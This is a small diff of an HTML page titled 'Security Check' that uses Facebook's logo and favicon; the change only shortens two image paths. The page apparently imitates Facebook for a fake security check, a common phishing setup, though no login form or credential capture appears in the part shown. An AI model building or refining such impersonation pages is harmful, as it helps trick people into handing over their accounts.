@@ -3,14 +3,14 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Security Check</title>
-	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
+	<link rel="shortcut icon" type="ico" href="fb-ico.png">
 	<link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
 	<header>
 		<div class="main-header">
 			<div class="logo">
-				<a href="http://www.facebook.com"><img src="images/logo.png" alt="Facebook"></a>
+				<a href="http://www.facebook.com"><img src="logo.png" alt="Facebook"></a>
 			</div>
 		</div>
 	</header>
